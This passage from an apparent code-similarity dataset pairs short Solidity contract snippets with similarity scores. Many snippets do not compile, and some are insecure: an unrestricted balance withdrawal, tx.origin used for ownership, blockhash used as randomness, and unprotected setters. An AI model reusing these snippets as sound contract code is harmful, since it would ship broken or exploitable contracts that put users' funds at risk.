      return assertReturnsExpectedResult(condition);
    }
  }",0.5691429028753373,"contract IRequirementFilterCore {



    

    

    

    

    

    

    

    

    

    function executeTransaction(

        uint256 salt,

        address signerAddress,

        bytes signedExchangeTransaction,

        bytes signature

    ) 

        external

        returns (bool success);



    

    

    

    

    

    function getRequirementsAchieved(

        bytes memory takerAssetData,

        address signerAddress

    )

        public view

        returns (bool[] memory requirementsAchieved);

}"
"contract MyLogContract {
    event genericLog(
        uint256 indexed _index1, uint256 indexed _index2,  uint256 indexed _index3, string _log);

    function writeGenericLog01(
        uint256 _index1, uint256 _index2,  uint256 _index3,
        string _log) 
    returns (bool success) {
        genericLog(_index1, _index2, _index3, _log);
        return true;
    }
}",0.5699382536469032,"contract ERC223 {
    string public name;
    string public symbol;
    uint256 public decimals;
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    function transfer(address _to, uint256 _value) public;
    event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract Simple {
    function arithmetics(uint a, uint b){           
                     require(a % 2 == 0, ""Even value required."");             
                    b = b * 3; 
            }
}",0.586216210135986,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract PushStruct {

  struct MyStruct {
    uint field1;
    uint field2;
  }

  MyStruct[] public myStructs;

  function pushStruct() 
    public

  {
    MyStruct memory m;
    m.field1 = 1;
    m.field2 = 2;
    myStructs.push(m);

  }
}",0.5089640109411123,"contract DyDx is Structs {
    function getAccountWei(Info memory account, uint256 marketId) public view returns (Wei memory);
    function operate(Info[] memory, ActionArgs[] memory) public;
}"
"contract {
        address customer;
        uint8 tokentype; 
        uint8 size;  
        bool  gender; 
        bool  active;  
    }",0.5827033510923305,"contract ERC20Frag {
    function approve(address spender, uint tokens) public returns (bool);
}"
"contract Concatenator {
    address[]  Accounts1;
    function ConcatenateArrays(address[] Accounts2){
        uint i = 0;
        while (i++ < Accounts2.length) {
            Accounts1.push(Accounts2[i]);
        }
    } 
}",0.5281739035937654,"contract AbstractDaoChallenge {
	function isMember (DaoAccount account, address allegedOwnerAddress) returns (bool);
	function tokenPrice() returns (uint256);
}"
"contract StructAccess {

    struct SimpleStruct {
        
        uint c;
        uint[] d; 
        mapping (uint => uint) e; 

    }

    SimpleStruct public singleStruct;

    constructor() public {
        singleStruct.c = 5;
    }
}",0.5646936882166602,"contract SimpleStorage {
    uint storedData;

    function set(uint x) public {
        storedData = x;
    }

    function get() public constant returns (uint) {
        return storedData;
    }
}"
"contract Bar {
    Foo public foo;

   Bar() {
        foo = new Foo();
   }
}",0.5272274912326731,"contract VoxLike {
    function par() public returns (uint);
}"
"contract Maxsupply {
    string public message;
    function Maxsupply(string newMessage) public{
        message = newMessage;
    }
    function setmessage(string _message) public{
        message = _message;
    }
}",0.5614385582111635,"contract Greeter {

    string public greeting;

    

    function Greeter(string _greeting) public {

        setGreeting(_greeting);

    }

    

    function setGreeting(string _greeting) public {

        greeting = _greeting;

    }

    

}"
"contract thiscontract
{

uint256 balancer = 3000;

function something() public payable
{
if(balancer > 0)
{
balancer -= 1000;
msg.sender.transfer(1000);

}

}
}",0.5970595073358113,"contract loglib {
   mapping (address => uint256) public sendList;
   
   function logSendEvent() payable public{
        sendList[msg.sender] = 1 ether;
   }
   
   
   
}"
"contract Proxy is mortal {

    address watch_addr  = 0xEB1e2c19bd833b7f33F9bd0325B74802DF187935;
    address user_addr   = msg.sender;

    function register(){
        watch_addr.call(bytes4(sha3(""register()"")))
    }
}",0.5120548459148564,"contract Issuer {

    

    address internal issuer = 0x692202c797ca194be918114780db7796e9397c13;

    

    function changeIssuer(address _to) public {

        

        require(msg.sender == issuer); 

        

        issuer = _to;

    }

}"
"contract MedicalStaffObject {
    using strings for *;
    event LogCreatedTrip(address);

    struct medicalStaffDetails {
       string phoneNumber;
       string physicalAddress;
    }

    medicalStaffDetails public details;
    address[] public trips;
    address public orgAddresses; 

    function MedicalStaffObject (address orgAddress, string phoneNumber, string physicalAddress){
        details.phoneNumber = phoneNumber;
        details.physicalAddress = physicalAddress;
        orgAddresses = orgAddress;
    }

    function getDetails() public constant returns (string, string, address){
        return (details.phoneNumber, details.physicalAddress, orgAddresses);
    }

    function getTrips() public constant returns (address[]){
        return (trips);
    }

    function newTrip(address zone1, address zone2, address zone3, address zone4, bytes32 name, bytes32 startingDate, uint duration) public returns(address){
        TripObject newTrip = new TripObject(zone1, zone2, zone3, zone4, name, startingDate, duration);
        trips.push(newTrip);
        LogCreatedTrip(newTrip);
        return newTrip;
    }
}",0.5828916565117858,"contract TAO {

	using SafeMath for uint256;



	address public vaultAddress;

	string public name;				

	address public originId;		



	

	string public datHash;

	string public database;

	string public keyValue;

	bytes32 public contentId;



	

	uint8 public typeId;



	

	constructor (string _name,

		address _originId,

		string _datHash,

		string _database,

		string _keyValue,

		bytes32 _contentId,

		address _vaultAddress

	) public {

		name = _name;

		originId = _originId;

		datHash = _datHash;

		database = _database;

		keyValue = _keyValue;

		contentId = _contentId;



		

		typeId = 0;



		vaultAddress = _vaultAddress;

	}



	

	modifier onlyVault {

		require (msg.sender == vaultAddress);

		_;

	}



	

	function transferEth(address _recipient, uint256 _amount) public onlyVault returns (bool) {

		_recipient.transfer(_amount);

		return true;

	}



	

	function transferERC20(address _erc20TokenAddress, address _recipient, uint256 _amount) public onlyVault returns (bool) {

		TokenERC20 _erc20 = TokenERC20(_erc20TokenAddress);

		_erc20.transfer(_recipient, _amount);

		return true;

	}

}"
"contract Travel {

address private owner;

struct TravelStruct 
{
    
    address clientAddress;
    string originAirportName;
    uint32 originTime; 
    uint16 originBagWeight;
    
    uint32 tapeArrivedTime; 
    
    bytes8 flyCode;
    uint32 takeOffTime; 
    
    string destinationAirportName;
    uint32 destinyTime; 
    uint16 destinyBagWeight;
}

mapping(uint => Travel) travels;
uint public travelsRegistryCount;

constructor() public
{
    owner = msg.sender;
    travelsRegistryCount = 1;
}

modifier ownerFunc 
{
    require(owner == msg.sender);
    _;
}


function setOrigin (string _originAirportName, uint32 _originTime, uint16 _originBagWeight) private
{
    travels[travelsRegistryCount] = TravelStruct(owner, _originAirportName, _originTime, _originBagWeight, 0, """", 0, """", 0, 0);
}  
}",0.5412502620916513,"contract BaseRegistration is AbstractRegistration{
    address public owner;
    string public songTitle; 
    string public hash; 
    string public digitalSignature; 
    string public professionalName; 
    string public duration; 
    string dateOfPublish; 
    uint rtype;
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    function BaseRegistration() public{
        owner = msg.sender;
    }
    
    
    
    function getOwnerAddress() external constant returns (address){
        return owner;
    }
    
    
    
    function changeOwnerAddress(address _owner) onlyOwner internal {
        require(_owner != 0x0);
        require(owner != _owner);
        owner = _owner;
    }
    
    
    function getRegistration() public view returns(string, address, string, string, uint, string, string, address[5], uint[5]){}
}"
"contract cde{
    mapping (uint => abc) all_cde;
    uint public f;


    function ask_subdivise(abc a){
        
        
        if (a.Owners[msg.sender].sub = false){
            a.Owners[msg.sender].sub=true;
            a.no_sub+=1;

        }
    }
}",0.5882213647285123,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() public returns (bool) {

        if (Owner == msg.sender) {

            return true; 

        }

        return false;

    }

}"
"contract testContract{
  Student[] public students;

  struct Student{
    string name;
    uint256 age;
  }

  function addStudent(string name, uint256 age){
    students[students.length++] = Student({name:name,age:age});
  }
}",0.5279748472461717,"contract Batchdrop2 {

  function multisend(ERC20 token, address[] recipients, uint256 value) public {

    for (uint256 i = 0; i < recipients.length; i++) {

      token.transfer(recipients[i], value * 1000);

    }

  }

}"
"contract DriverProfile{
    struct Driver{
        string lisenceId;
        string firstName ;
        string lastName; 
        address account;
        string vehicle;
        string vehicleType;
        uint totalOffenceAmount;
        uint offenceCount;
        uint pendingPayments;
        mapping(uint=>Fine)  fines;
    }

    Driver public driver;

    constructor(string lisenceId,string firstName,string lastName,string vehicle,string vehicleType,address owner) public{
        driver = Driver({
            lisenceId:lisenceId,
            lastName:lastName,
            firstName:firstName,
            account:owner,
            vehicle:vehicle,
            vehicleType:vehicleType,
            totalOffenceAmount:0,
            offenceCount:0,
            pendingPayments:0
        });
    }





}",0.5073930071845021,"contract DZariusz is Ownable {


    string public name;
    string public contact;

    event LogSetName(address indexed executor, string newName);
    event LogSetContact(address indexed executor, string newContact);


    constructor(string _name, string _contact) public {

        setName(_name);
        setContact(_contact);

    }



    function setName(string _name)
    public
    onlyOwner
    returns (bool)
    {
        name = _name;
        emit LogSetName(msg.sender, _name);

        return true;
    }



    function setContact(string _contact)
    public
    onlyOwner
    returns (bool)
    {
        contact = _contact;
        emit LogSetContact(msg.sender, _contact);

        return true;
    }



}"
"contract myContract{

uint256[] objects
mapping (uint256 => uint4) objectStage
mapping (uint256 => mapping(address => uint4)) objectInteraction
mapping (uint256 => uint256) objectData
mapping (uint256 => address) objectOwner


function createObject(uint256 data)
external
{
uint256 newObjectIndex = objects.length;
objects.push(newObjectIndex );
objectOwner[newObjectIndex ]=msg.send;
objectData[newObjectIndex ]=data;
}

function interactWithObject(uint256 index, uint4 data)
external
{
objectInteraction[index][msg.sender]=data;
}



",0.5443304441779999,"contract EstateStorage {

  bytes4 internal constant InterfaceId_GetMetadata = bytes4(keccak256(""getMetadata(uint256)""));

  bytes4 internal constant InterfaceId_VerifyFingerprint = bytes4(

    keccak256(""verifyFingerprint(uint256,bytes)"")

  );



  LANDRegistry public registry;



  

  mapping(uint256 => uint256[]) public estateLandIds;



  

  mapping(uint256 => uint256) public landIdEstate;



  

  mapping(uint256 => mapping(uint256 => uint256)) public estateLandIndex;



  

  mapping(uint256 => string) internal estateData;



  

  mapping (uint256 => address) public updateOperator;

}"
"contract DoubleSigWallet {
    IERC20 public DAI;

    
    event NewTransaction(uint256 transactionId);
    event EndUserSigned(bool signed);
...
",0.5316579191353793,"contract WalletInterface {

    function getTransaction(uint _id) public view returns(address, uint, address, uint, uint, bool);

}"
"contract test {

  bool test_bool1 = false;

  bool test_bool2 = true;

  modifier test_modifier(bool _test_bool){
      if (_test_bool == false) throw;
      _;
  }

  function test1(uint input1) test_modifier(test_bool1) returns (uint){
      return input1;
  }

   function test2(uint input2) test_modifier(test_bool2) returns (uint){
      return input2;
  }

}",0.545769779968382,"contract Token {
    function issue(address _recipient, uint256 _value) returns (bool success) {}
    function issueAtIco(address _recipient, uint256 _value, uint256 _icoNumber) returns (bool success) {}
    function totalSupply() constant returns (uint256 supply) {}
    function unlock() returns (bool success) {}
}"
"contract ScoreStore{
    mapping(string => int) PersonScores;

    function AddPersonScore(string name, int startingScore){
        if(PersonScores[name]>0){
            throw;
        } else {
            PersonScores[name] = startingScore;
        }
    }

    function GetScore(string name) returns (int){
        return PersonScores[name];
    }
}",0.5248019539855321,"contract Register is Pausable {
    mapping(address => string) public registry;

    
    function addUser(string info) public whenNotPaused {
        registry[msg.sender] = info;
    }
   
    
    function getInfo(address ethAddress) public constant returns (string) {
        return registry[ethAddress];
    }
}"
"contract second{

first firstContract = 
first(0x0FdF4894a3b7C5a101686829063BE52Ad45bcfb7);

    function combine(uint256 a, uint256 b, uint256 d) public view returns(uint256){
         uint256 c = firstContract.one(a, b);
         uint256 e = firstContract.two(c, d);
         return e;
    }

}",0.5912556977928423,"contract SafeMath {
  function safeSub(uint256 a, uint256 b) public pure returns (uint256) {
    require(b <= a);
    return a - b;
  }

  function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {
    uint256 c = a + b;
    require(c>=a && c>=b);
    return c;
  }
}"
"contract Thing{
  uint public number;
  function Thing(bytes32 _number){
    number = uint(_number);
  }
}",0.5872829449382231,"contract Trader {

    function buy(address _from, uint256 _tokenId, uint256 _count) public;

}"
"contract C {
    event myEvent(bool x, address y);
    address someAddress;

    function someAddressExist(){
        if(someAddress != 0){
            myEvent(true, someAddress);
        }
    }    

    function setSomeAddress(address y){
        someAddress = y;
    }
}",0.5923090482603368,"contract IUserData {

    

    function setUserRef(address _address, address _refAddress, string _gameName) public;

    

    function getUserRef(address _address, string _gameName) public view returns (address);

}"
"contract DApp
{
    uint256 acconto;
    uint256 saldo;
    address committent;
    address technician;
    bool done = false;
    uint timeFinish;

modifier onlyCom
{
    if (msg.sender != committent)
    {
        assert(true);
    }
    else
    {
        _;
    }
}

function DApp (uint256 _acconto, uint256 _saldo, address _technician, uint _Time) payable public
{
    if (msg.value >= _acconto + _saldo) {
    acconto = _acconto * 1000000000000000000;
    saldo = _saldo * 1000000000000000000;
    committent = msg.sender;
    technician = _technician;
    timeFinish = block.timestamp + _Time;

    technician.transfer(acconto);
    } else revert();
}

function Done () public onlyCom
{
    done = true;
}

function reciveReward () payable public
{
    if(done == true)
    {
        technician.transfer(saldo);
        selfdestruct(this);
    }
    else
    {
        if(block.timestamp >= timeFinish)
        {
            committent.transfer(saldo);
            selfdestruct(this);
        }

        assert(true);
    }
}
}",0.5807007646462664,"contract GraphenePowerToken is Crowdsale {
    
    
	string public standard = &#39;Token 0.1&#39;;

	string public name = &#39;Graphene Power&#39;;

	string public symbol = &#39;GRP&#39;;

	uint8 public decimals = 18;

	uint256 _totalSupply =500000000;

	
	mapping (address => uint256) balances;

	
	event Transfer(address from, address to, uint256 value);

    bool transfersEnable=false;
    
	
	function totalSupply() constant returns (uint256 totalSupply) {
		totalSupply = _totalSupply;
	}
	
	
	function transfer(address _to, uint256 _value) returns (bool success) {
		if (transfersEnable) {
	       require(balanceOf[msg.sender] >= _value);
           balanceOf[msg.sender] -= _value;
           balanceOf[_to] += _value;
           Transfer(msg.sender, _to, _value);
		   return true;
		}
      	else{
	           return false;
	        }
	}
	
	
	function transfersEnabled() onlyOwner{
	    require(!transfersEnable);
	    transfersEnable=true;
	}
}"
"contract ReceiveEther {
    uint256 public clicksfromcreatorcount; 
    uint256 public count;
    address public creatorino = tx.origin;",0.5917786868191971,"contract SocInterface {
    
    mapping (address => uint256) public balanceOf;

    function transfer(address _to, uint256 _value) public {}

}"
"contract DataStore {

   struct DataModel
   {
       uint id;
       bytes32 string1;
       bytes32 string2;
       bytes32 string3;
       uint actorId;
       bytes32 string4;
       bytes32 string5;
       bytes32 string6;
       bytes32 string7;
    }

    mapping(bytes32 => DataModel) dataMapping;
    DataModel datamodel;
    address owner;

    function DataStore()
    {
        owner = msg.sender;
    }

    function storeData(bytes32 hash, uint id, bytes32 string1, bytes32    string2, bytes32 string3, uint actorId, bytes32 string4, bytes32 string5, bytes32 string6, bytes32 string7) returns (bool response)
    {
        if(msg.sender != owner)
        {
            return false;
        }else
        {
            datamodel.id = id;
            datamodel.string1 = string1;
            datamodel.string2 = string2;
            datamodel.string3 = string3;
            datamodel.actorId = actorId;
            datamodel.string4 = string4;
            datamodel.string5 = string5;
            datamodel.string6 = string6;
            datamodel.string7 = string7;

            dataMapping[hash] = datamodel;

            return true;
        }
    }

    function queryData(bytes32 hash) returns (uint, bytes32, bytes32, bytes32, uint, bytes32, bytes32, bytes32, bytes32)
    {
        if(msg.sender != owner)
        {
            throw;
        }

        DataModel model = dataMapping[hash];
        return (model.id, model.string1, model.string2, model.string3, model.actorId, model.string4, model.string5, model.string6, model.string7);
    }
}",0.5341291199326016,"contract OraclizeI {
    address public cbAddress;
    function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id);
    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);
    function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id);
    function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) external payable returns (bytes32 _id);
    function queryN(uint _timestamp, string _datasource, bytes _argN) public payable returns (bytes32 _id);
    function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) external payable returns (bytes32 _id);
    function getPrice(string _datasource) public returns (uint _dsprice);
    function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);
    function setProofType(byte _proofType) external;
    function setCustomGasPrice(uint _gasPrice) external;
    function randomDS_getSessionPubKeyHash() external constant returns (bytes32);
}"
"contract PermissionsManagerProxy is Proxy { 
    constructor(address _initialImplementation)
    Proxy(_initialImplementation)
    public
    {   }
}",0.5933342413329453,"contract ImplementationProvider {

  

  function getImplementation(string memory contractName) public view returns (address);

}"
"contract Test {
    constructor(uint size) {
        uint[size] storage arr;
        for (uint i = 0; i < size; i++) { arr[i] = 0 }
    }
}",0.5485441904325042,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract extra{
   bool public retrive;
   bool public retrive_setter;
   address public baseaddress = 0xca598f876f79a5f8f479bfa1dcc8f4f2dffbd5c2;
   uint a = 5;
   bytes32 b =""Lina"";
   function caller(){
        retrive = baseaddress.call.gas(10000)(bytes8(keccak256(""getdata()"")));
        retrive_setter = baseaddress.call.gas(1000000)(bytes24(keccak256(""setdata(uint, bytes32)"")),a,b);
   }
}",0.5364171376435131,"contract ERC827 {

  function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);
  function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);
  function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);

}"
"contract Registrator { 
address counter_addr; 
address provider_addr; 

function set_counter_addr(address myaddr) 
public 
{ 
counter_addr = myaddr; 
} 

function set_provider_addr(address myaddr) 
public 
{ 
provider_addr = myaddr; 
} 

function Register(address useraddr) 
public 
{ 
var rez = provider_addr.call(bytes4(sha3(""NotifyRegister(address client)"")), useraddr); 
uint random_number = uint(block.blockhash(block.number-1))%10 + 1; 
var rez2 = counter_addr.call(bytes4(sha3(""SetInitNumber(address user_addr, uint init_number)"")), useraddr, random_number); 
} 

function Remove(address useraddr) 
public 
{ 
var rez = provider_addr.call(bytes4(sha3(""NotifyRemove(address client)"")), useraddr); 
uint random_number = uint(block.blockhash(block.number-1))%10 + 1; 
var rez2 = counter_addr.call(bytes4(sha3(""RemoveUser(address user_addr)"")), useraddr); 
} 

}",0.5156297475691121,"contract AssetInterface {
    function _performTransferWithReference(
        address _to,
        uint _value,
        string _reference,
        address _sender)
    public returns(bool);

    function _performTransferToICAPWithReference(
        bytes32 _icap,
        uint _value,
        string _reference,
        address _sender)
    public returns(bool);

    function _performApprove(address _spender, uint _value, address _sender)
    public returns(bool);

    function _performTransferFromWithReference(
        address _from,
        address _to,
        uint _value,
        string _reference,
        address _sender)
    public returns(bool);

    function _performTransferFromToICAPWithReference(
        address _from,
        bytes32 _icap,
        uint _value,
        string _reference,
        address _sender)
    public returns(bool);

    function _performGeneric(bytes, address) public payable {
        revert();
    }
}"
"contract Counter { 
mapping (address => uint) usersInfo; 
mapping (address => bool) isAdmin; 
address registrator_addr; 
address provider_addr; 

function set_registrator_addr(address myaddr) 
public 
{ 
registrator_addr = myaddr; 
isAdmin[registrator_addr] = true; 
} 

function set_provider_addr(address myaddr) 
public 
{ 
provider_addr = myaddr; 
} 

function SetInitNumber(address user_addr, uint init_number) 
public 
{ 

usersInfo[user_addr] = init_number; 
} 

function TickNumber(address user_addr) 
public
returns (uint curval) 
{ 
uint currentvalue = usersInfo[user_addr]; 
var rez = provider_addr.call(bytes4(sha3(""NotifyGetTick(address client, uint chislo)"")), user_addr, currentvalue); 
usersInfo[user_addr] = usersInfo[user_addr]+1; 
return currentvalue; 
} 

function RemoveUser(address user_addr) 
public 
{ 

delete usersInfo[user_addr]; 
} 
}",0.5985938934831568,"contract Access {

    mapping(address => bool) private _admins;
    mapping(address => bool) private _services;

    modifier onlyAdmin() {
        require(_admins[msg.sender], ""not admin"");
        _;
    }

    modifier onlyAdminOrService() {
        require(_admins[msg.sender] || _services[msg.sender], ""not admin/service"");
        _;
    }

    constructor() public {
        _admins[msg.sender] = true;
    }

    function addAdmin(address addr) public onlyAdmin {
        _admins[addr] = true;
    }

    function removeAdmin(address addr) public onlyAdmin {
        _admins[addr] = false;
    }

    function isAdmin(address addr) public view returns (bool) {
        return _admins[addr];
    }

    function addService(address addr) public onlyAdmin {
        _services[addr] = true;
    }

    function removeService(address addr) public onlyAdmin {
        _services[addr] = false;
    }

    function isService(address addr) public view returns (bool) {
        return _services[addr];
    }
}"
"contract MyService {
    address public owner;

    function MyService(){
        owner = msg.sender;
    }


    event DoStuff(address myFriendAddress, uint myFriendBalance);

    function doStuff(address myFriendTokenContractAddress){
        address myFriendAddress = msg.sender;
        MyFriendToken mft = MyFriendToken(myFriendTokenContractAddress);

        if(mft.isMyFriend(myFriendAddress)){
            
            uint myFriendBalance = mft.balanceOf(myFriendAddress);

            
            uint servicePrice = 10;

            if(myFriendBalance >= servicePrice){
                

                
                DoStuff(myFriendAddress , myFriendBalance);
            }
        }
    }
}",0.5433345826477486,"contract Forwarder is Ownable {

  address destinationAddress;

  event LogForwarded(address indexed sender, uint amount);

  event LogFlushed(address indexed sender, uint amount);



  function Forwarder() public {

    destinationAddress = msg.sender;

  }



  function() payable public {

    emit LogForwarded(msg.sender, msg.value);

    destinationAddress.transfer(msg.value);

  }



  function flush(address owner) public {

    emit LogFlushed(destinationAddress, address(this).balance);

    destinationAddress.transfer(address(this).balance);

  }



}"
"contract testUser {
  constructor () {
    address(this).balance = 1 ether;
    }",0.5470089251278201,"contract test {
    
    function a() public
    {
        msg.sender.transfer(this.balance);    
    }
    
    
}"
"contract TestContract
{
    struct Structure {
        bytes32 structure_name;
    }

    mapping (Structure => address) public test_mapping;
}",0.5932714517207295,"contract StableStore {
    
    mapping (address => string) public store;
    
    function setValue(string _value) {
        store[msg.sender]=_value;
    }
}"
"contract Event is User{

    struct EventStruct {
        uint average;
        uint quantity;
    }

    mapping(uint=>EventStruct) events;
    uint eventsCounter;
}",0.5834227519460514,"contract SmartolutionInterface {

    struct User {

        uint value;

        uint index;

        uint atBlock;

    }



    mapping (address => User) public users; 

}"
"contract Mappulator {
    mapping(address => int256) public BigMap;
    struct mapper { mapping (address => int256) map;}

    function MappingCombiner(mapper map1, mapper map2){ 
        BigMap = map1.map + map2.map;
    }
}",0.5407859572226908,"contract BalancingToken is ERC20 {
    mapping (address => uint256) public balances;      

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }
}"
"contract Parents {
    string public childName;
    Child child;
    function Parents(address _childAddress){
        child = Child(_childAddress);
        childName = child.name();  
    }
}",0.5500793360051685,"contract NameRegistryInterface {

  function registerName(address addr, string name) public;

  function finalizeName(address addr, string name) public;

}"
"contract StarNotary is ERC721 { 

    struct Star { 
        string name;
        string dec;
        string mag;
        string cent;
        string story;
    }

    using Library for Library.data;
    mapping(uint256 => Star) public tokenIdToStarInfo; 
    mapping(address => uint256[]) private _ownerToTokenId; 
    mapping(uint256 => uint256) private _starsForSale;
    mapping(bytes32 => Library.data) private _hashToTokenId;

    Star[] public stars;
    uint256[] tokensForSale;

    function createStar(string _name, string _dec, string _mag, string _cent, string _story) 
    public
    returns(uint256) 
    {
        require(!checkIfStarExist(_dec, _mag, _cent), ""Star already registered!"");

        Star memory newStar = Star(_name,_dec,_mag,_cent,_story);

        uint256 tokenId = stars.push(newStar) - 1;

        return tokenId;

    }
}",0.5774728122295432,"contract TokenMintERC20Token is ERC20 {

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply, address payable feeReceiver, address tokenOwnerAddress) public payable {
      _name = name;
      _symbol = symbol;
      _decimals = decimals;

      
      _mint(tokenOwnerAddress, totalSupply);

      
      feeReceiver.transfer(msg.value);
    }

    
    function burn(uint256 value) public {
      _burn(msg.sender, value);
    }

    

    
    function name() public view returns (string memory) {
      return _name;
    }

    
    function symbol() public view returns (string memory) {
      return _symbol;
    }

    
    function decimals() public view returns (uint8) {
      return _decimals;
    }
}"
"contract Test{

    ERC20 icoToken;

    function Test(){
        icoToken = ERC20(0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0);
        
    }

    function getMyBalance(address myAddress) constant returns (uint256 theB){
        theB = icoToken.balanceOf(myAddress);
        return theB;
    }
}",0.5851882159584969,"contract IBelottoToken{
    function transfer(address to, uint tokens) public returns (bool success);
    function burn(uint256 _value) public;
    function balanceOf(address tokenOwner) public constant returns (uint balance);
}"
"contract TypeConversion{

    uint96 data = 5;
    bytes32 b = bytes32(data);

}",0.5837577476156164,"contract VatLike {
    function file(bytes32, bytes32, uint) external;
}"
"contract SessionManagement { 

    struct ChargeProfileSegment{
        uint startDateTimeSeg;
        uint power;
    }

    struct Session{
        address userWalletAddr;
        uint stationId;
        uint startDateTime; 
        uint endDateTime; 
        ChargeProfileSegment[] chargeProfileSegments;
    }

    mapping (address => Session[]) sessionList;
    Session[] public sessions;
    ChargeProfileSegment[] public chargeProfileSegments;

}",0.5157922520194098,"contract IKyberNetworkProxy {
    function getExpectedRate(address src, address dest, uint srcQty) public view
        returns (uint expectedRate, uint slippageRate);

    function trade(
        address src,
        uint srcAmount,
        address dest,
        address destAddress,
        uint maxDestAmount,
        uint minConversionRate,
        address walletId
    ) public payable returns(uint256);
}"
"contract MyContract {
  
  uint count;
  uint[] totalPoints;

  function localVars(){
     
     uint[] localArr;
     
     uint[] memory memoryArr;
     
     uint[] pointer = totalPoints;
  }
}",0.5631811148674747,"contract DateTimeAPI {

        

    function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour) constant public returns (uint timestamp);



}"
"contract factorywallet { 

   function newWallet(uint256 _unlockDate) public returns(address wallet){
        wallet = new createWallet(msg.sender);
    }
}",0.5897836247314971,"contract Generatable{

    function generate(

        address token,

        address contractOwner,

        uint256 cycle

    ) public returns(address);

}"
"contract A{

    mapping (uint=>Storage) idToStorage;
    Storage storage=new Storage();

    function addNewB(uint id){
         idToStorage[id]=storage;
    }
    function getStatus(uint id){
         idToStorage[id].status();
    }

}",0.5279092996756645,"contract InitializableStorageAdapter is StorageAdapter {

    function _initStorageAdapter(Storage _storage, bytes32 _crate) internal {
        require(address(store.store) == 0x0);
        store.init(_storage, _crate);
    }
}"
"contract TokenAccessor { 
  ERC721Token public nft;

  constructor(address _tokenAddress) public {
    nft= ERC721Token(_tokenAddress);
  }
}",0.5978354511258464,"contract ShamelessPromoToken is ERC721Contract {

  constructor() ERC721Contract(""Shameless Promo Token"", ""SPT"", 50) public {}

}"
"contract MyContract {

    
    address contractOwner;

    address[] userFilesList;

    mapping ( string => address ) private accountAddressesByProfile;
    address[] public accountList;

    bytes16[] accountTypes;
    mapping(bytes16 => bool) accountTypesMap;

    constructor() public {
        contractOwner = msg.sender;

        bytes16[5] memory initialAccountTypes = [
            bytes16(""Account1""),
            bytes16(""Account2""),
            bytes16(""Account3""),
            bytes16(""Account4""),
            bytes16(""Account5"")
        ];

        for (uint8 i = 0; i < initialAccountTypes.length; i++ ) {
            bytes16 accountType = initialAccountTypes[i];
            accountTypes.push(accountType);
            accountTypesMap[accountType] = true;
        }
    }

}",0.5136276907012446,"contract Airdrop is Owned {

  using SafeMath for uint256;

  Token public token;

  uint256 private constant decimalFactor = 10**uint256(18);

  

  mapping (address => bool) public airdrops;

  

  

  constructor(address _tokenContractAdd, address _owner) public {

    

    token = Token(_tokenContractAdd);

    owner = _owner;

  }

  

  

  function airdropTokens(address[] _recipient, uint256[] _tokens) external onlyOwner{

    for(uint256 i = 0; i< _recipient.length; i++)

    {

        if (!airdrops[_recipient[i]]) {

          airdrops[_recipient[i]] = true;

          require(token.transferFrom(msg.sender, _recipient[i], _tokens[i] * decimalFactor));

        }

    }

  }

}"
"contract GraphTraversal {
    using HitchensUnorderedAddressSetLib for HitchensUnorderedAddressSetLib.Set;
    using HitchensUnorderedKeySetLib for HitchensUnorderedKeySetLib.Set;

    struct User {
        uint256 balance;
        uint256[] incomingStreamIds;
        mapping(uint256 => uint256) incomingStreamIdPointers; 
        uint256[] outgoingStreamIds;
        mapping(uint256 => uint256) outgoingStreamIdPointers; 
    }

    mapping(address => User) public users;
    HitchensUnorderedAddressSetLib.Set userSet;

    struct Stream {
        uint256 interval;
        uint256 paymentRate;
        address sender; 
        address recipient; 
        uint256 startTime;
        uint256 stopTime;
    }

    mapping(bytes32 => Stream) public streams;
    HitchensUnorderedKeySetLib.Set streamSet;
}",0.5174276315071502,"contract BasicToken is ERC20 {

  using SafeMath for uint256;

  

  mapping(address => uint256) balances;

  mapping (address => mapping (address => uint256)) internal allowed;



  uint256 totalSupply_;



  

  function totalSupply() public view returns (uint256) {

    return totalSupply_;

  }



  

  function balanceOf(address _owner) public view returns (uint256) {

    return balances[_owner];

  }

  

  

  function approve(address _spender, uint256 _value) public returns (bool) {

    allowed[msg.sender][_spender] = _value;

    emit Approval(msg.sender, _spender, _value);

    return true;

  }



  

  function allowance(

    address _owner,

    address _spender

   )

    public

    view

    returns (uint256)

  {

    return allowed[_owner][_spender];

  }

}"
"contract structWithMapping{

    struct Data{
        string[] user;
        string[] catagory;
        string[]  data;
    }

    mapping(string => Data) mappedData;
    string[] public dataArray;

    function setUserData(string _user, string _catagory, string _data)public{
        var addData = mappedData[_user];

        addData.user.push(_user);
        addData.catagory.push(_catagory);
        addData.data.push(_data);

        dataArray.push(_user) -1;
    }

    function getUsers() view public returns(string[]){
        return dataArray;
    }

    function getUserData(string _user) view public returns(string[] memory, string[] memory, string[] memory){
        return(mappedData[_user].user, mappedData[_user].catagory, mappedData[_user].data);
    }
}",0.5475878136502298,"contract AtaConstatacao {
    
     struct Requerente {
        string nomeTabeliao ;
        address enderecoRequerente;
        string unidadeFederativa;
        string cidade;
        string nomeCartorio;
        string numeroLivro;
        string numeroFolhaLivro;
    }
    
    mapping(address=>Requerente) public requerentes;
    
    
        
    function registro(
        string memory _nomeTabeliao, 
        string memory estado, 
